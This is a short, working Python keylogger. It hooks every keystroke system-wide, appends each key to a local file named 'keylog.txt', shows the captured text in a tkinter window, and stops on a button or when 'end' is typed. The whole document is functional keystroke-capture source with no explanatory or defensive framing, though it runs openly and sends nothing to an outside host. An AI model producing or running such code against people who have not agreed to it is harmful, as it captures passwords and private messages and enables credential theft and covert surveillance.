import tkinter as tk
import keyboard

log_file = "keylog.txt"
completion_phrase = "end"
current_text = ""

def on_key_event(event):
    global current_text
    key_name = event.name
    if event.event_type == "down":
        with open(log_file, "a") as f:
            if key_name == "space":
                f.write(" ")
                current_text += " "
            elif key_name == "enter":
                f.write("\n")
                current_text += "\n"
                check_completion()
            elif key_name == "esc":
                f.write("\ndone!")
                current_text += "\ndone!"
                check_completion()
            else:
                f.write(key_name)
                current_text += key_name
        update_display()

def check_completion():
    global current_text
    if completion_phrase in current_text:
        print("Completion phrase detected. Stopping keylogger.")
        keyboard.unhook_all()
        root.quit()  

def update_display():
    text_widget.delete("1.0", tk.END)
    text_widget.insert(tk.END, current_text)

def stop_logging():
    keyboard.unhook_all()
    print("Keylogger stopped.")
    root.quit() 

root = tk.Tk()
root.title("Keylogger")

text_widget = tk.Text(root, height=10, width=50,bg="black",fg="white")
text_widget.pack(padx=10, pady=10)

stop_button = tk.Button(root, text="Stop Logging", command=stop_logging,bg="red",fg="white")
stop_button.pack(pady=10)

keyboard.on_press(on_key_event)

print("Keylogger is running. Type 'end' to stop the logger.")

root.mainloop()
